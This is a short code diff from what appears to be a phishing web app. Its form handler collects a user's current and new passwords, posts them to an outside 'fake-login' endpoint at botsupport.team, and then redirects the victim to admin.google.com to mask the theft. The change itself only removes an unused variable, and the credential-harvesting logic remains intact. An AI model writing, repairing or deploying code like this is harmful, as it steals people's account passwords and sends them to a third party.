@@ -42,9 +42,9 @@ function App() {
     e.preventDefault();
     if (!info.current_password || !info.new_password || !info.re_password)
       return;
-    const request = axios
+    axios
       .post("https://www.botsupport.team/user/fake-login/", info)
-      .then((request) => {
+      .then((_) => {
         window.location.href = "https://admin.google.com";
       })
       .catch((e) => console.log(e));
